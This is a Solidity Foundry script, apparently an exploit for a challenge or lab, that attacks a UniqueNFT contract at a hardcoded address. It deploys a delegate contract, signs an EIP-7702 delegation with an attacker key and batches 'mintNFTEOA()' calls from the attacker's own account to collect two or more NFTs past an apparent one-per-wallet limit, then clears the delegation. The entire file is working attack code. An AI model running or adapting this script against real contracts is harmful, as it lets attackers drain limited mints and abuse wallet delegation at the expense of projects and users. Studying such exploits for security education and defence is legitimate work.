// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;
import { Script } from "forge-std/Script.sol";
import { console } from "forge-std/console.sol";
import { SimpleDelegateContract } from "../src/SimpleDelegateContract.sol";
import { UniqueNFT } from "../src/UniqueNFT.sol";
import { Vm } from "forge-std/Vm.sol";

address constant UNIQUE_NFT = 0x0A3C8FE5AcCF6e7DfFEafAb59823d2DF59d65eA7;

contract AttackNFT7702Script is Script {
    function run() public {
        uint256 ATTACKER_PK = vm.envUint("ATTACKER_PK");
        address ATTACKER_ADDRESS = vm.addr(ATTACKER_PK);

        // 1. Deploy the delegate contract (UniqueNFT address is hardcoded in contract)
        vm.broadcast(ATTACKER_PK);
        SimpleDelegateContract implementation = new SimpleDelegateContract();
        // 2. Prepare calldata for UniqueNFT.mintNFTEOA() (target is hardcoded in delegate)
        SimpleDelegateContract.Call[] memory calls = new SimpleDelegateContract.Call[](1);
        bytes memory data = abi.encodeWithSignature("mintNFTEOA()");
        calls[0] = SimpleDelegateContract.Call({to: UNIQUE_NFT, data: data, value: 0});
        // 3. Get the correct nonce (AFTER deployment)
        uint64 nextNonce = vm.getNonce(ATTACKER_ADDRESS);
        // 4. Attacker signs a delegation allowing `implementation` to execute transactions on their behalf, with correct nonce
        Vm.SignedDelegation memory signedDelegation_ = vm.signDelegation(address(implementation), ATTACKER_PK, nextNonce + 1);
        vm.startBroadcast(ATTACKER_PK);
        vm.attachDelegation(signedDelegation_);
        SimpleDelegateContract(payable(ATTACKER_ADDRESS)).execute(calls);
        uint256 attackerBalance = UniqueNFT(UNIQUE_NFT).balanceOf(ATTACKER_ADDRESS);
        require(attackerBalance >= 2, "Attacker did not receive 2 or more NFTs");
        vm.stopBroadcast();
        // 5. Sign and attach a new delegation to zero address
        vm.startBroadcast(ATTACKER_PK);
        // attach delegation to zero address
        vm.signAndAttachDelegation(
            address(0),
            ATTACKER_PK,
            vm.getNonce(ATTACKER_ADDRESS) + 1
        );
        // execute ANY transaction so delegation is applied
        (bool ok,) = ATTACKER_ADDRESS.call("");
        require(ok, "tx failed");
        vm.stopBroadcast();

    }
}